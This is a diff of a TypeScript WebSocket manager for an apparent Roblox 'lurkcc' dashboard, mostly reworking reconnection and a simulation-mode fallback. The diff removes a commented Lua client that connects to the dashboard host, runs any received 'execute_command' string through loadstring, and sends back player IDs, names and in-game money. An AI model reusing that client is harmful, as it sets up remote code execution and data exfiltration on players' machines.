@@ -1,3 +1,4 @@
+
 /**
  * WebSocket Server implementation for Roblox client connectivity
  * This utility provides a WebSocket server that Roblox clients can connect to
@@ -25,6 +26,7 @@ class WebSocketManager {
   private isConnecting: boolean = false;
   private reconnectAttempts: number = 0;
   private maxReconnectAttempts: number = 5;
+  private isSimulationMode: boolean = false;
 
   private constructor() {
     // Use the deployed app URL for WebSocket connection
@@ -52,26 +54,14 @@ class WebSocketManager {
     console.log("Setting up WebSocket server for Roblox client connections");
     
     try {
-      // In development, use the mock implementation
-      if (import.meta.env.DEV) {
-        // Try to connect to real server first
-        this.connectToServer();
-        
-        // If connection fails, simulate client connections after a short delay
-        setTimeout(() => {
-          if (!this.server || this.server.readyState !== WebSocket.OPEN) {
-            console.log("Using simulated clients for development");
-            this.simulateClientConnections();
-          }
-        }, 5000);
-      } else {
-        // In production, attempt to establish a real WebSocket connection
-        this.connectToServer();
-      }
+      // Always try to connect to real server first
+      this.connectToServer();
+      
+      // If connection fails, simulation mode will be activated in the connectToServer error handling
     } catch (error) {
       console.error("Error setting up WebSocket server:", error);
       // Fallback to simulation in case of error
-      this.simulateClientConnections();
+      this.activateSimulationMode();
     }
 
     // Listen for window unload to properly close connections
@@ -102,9 +92,7 @@ class WebSocketManager {
         this.server = socket;
         this.isConnecting = false;
         this.reconnectAttempts = 0;
-        
-        // Send authentication if needed
-        // socket.send(JSON.stringify({ action: "authenticate", token: "your-auth-token" }));
+        this.isSimulationMode = false;
         
         // Emit connection event
         this.emit('serverConnected', { status: 'connected' });
@@ -136,7 +124,7 @@ class WebSocketManager {
           setTimeout(() => this.connectToServer(), delay);
         } else {
           console.log("Max reconnection attempts reached, falling back to simulation");
-          this.simulateClientConnections();
+          this.activateSimulationMode();
         }
       };
       
@@ -146,16 +134,33 @@ class WebSocketManager {
         if (socket.readyState !== WebSocket.CLOSED) {
           socket.close();
         }
+        
+        // If this is the first error, fall back to simulation immediately
+        if (this.reconnectAttempts === 0) {
+          this.activateSimulationMode();
+        }
       };
     } catch (error) {
       console.error("Failed to connect to WebSocket server:", error);
       this.isConnecting = false;
-      
-      // Fallback to simulation
-      if (import.meta.env.DEV) {
-        this.simulateClientConnections();
-      }
+      this.activateSimulationMode();
     }
+  }
+
+  private activateSimulationMode() {
+    if (!this.isSimulationMode) {
+      console.log("Using simulated clients for development");
+      this.isSimulationMode = true;
+      this.simulateClientConnections();
+      
+      // Emit simulation mode event
+      this.emit('simulationModeActivated', { status: 'simulation' });
+    }
+  }
+
+  // Method to check if the manager is in simulation mode
+  public isInSimulationMode(): boolean {
+    return this.isSimulationMode;
   }
 
   // Method to check if the server is connected
@@ -358,92 +363,4 @@ class WebSocketManager {
 
 export default WebSocketManager;
 
-// Example Lua code for Roblox clients to connect to this WebSocket server:
-/*
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-
--- Function to establish WebSocket connection
-local function connectToWebSocket()
-    local websocket
-    
-    -- Try to create a WebSocket connection
-    local success, error = pcall(function()
-        websocket = WebSocket.connect("wss://lurkcc-dashboard.lovable.app/ws")
-    end)
-    
-    if not success then
-        warn("Failed to connect to WebSocket: " .. tostring(error))
-        return
-    end
-    
-    -- Handle incoming messages
-    websocket.OnMessage:Connect(function(message)
-        local success, data = pcall(function()
-            return HttpService:JSONDecode(message)
-        end)
-        
-        if success then
-            -- Handle different message types
-            if data.action == "execute_command" then
-                local command = data.data.command
-                print("Received command: " .. command)
-                
-                -- Execute the command
-                pcall(function()
-                    loadstring(command)()
-                end)
-            end
-        else
-            warn("Failed to parse message: " .. message)
-        end
-    end)
-    
-    -- Send initial client data
-    local clientData = {
-        action = "client_connected",
-        data = {
-            userId = player.UserId,
-            username = player.Name,
-            place = game.PlaceId,
-            money = player.leaderstats and player.leaderstats.Money and player.leaderstats.Money.Value or 0,
-            additionalData = {
-                -- Add any additional data you want to send here
-            }
-        }
-    }
-    
-    websocket:Send(HttpService:JSONEncode(clientData))
-    
-    -- Keep sending heartbeat
-    spawn(function()
-        while wait(30) do
-            if websocket.ReadyState == 1 then -- 1 means the connection is open
-                websocket:Send(HttpService:JSONEncode({
-                    action = "heartbeat",
-                    data = {
-                        userId = player.UserId
-                    }
-                }))
-            else
-                break
-            end
-        end
-    end)
-    
-    return websocket
-end
-
--- Start connection
-local ws = connectToWebSocket()
-
--- Reconnect if disconnected
-spawn(function()
-    while wait(60) do -- Check every minute
-        if not ws or ws.ReadyState ~= 1 then
-            ws = connectToWebSocket()
-        end
-    end
-end)
-*/
+// Lua code reference is kept but omitted for brevity
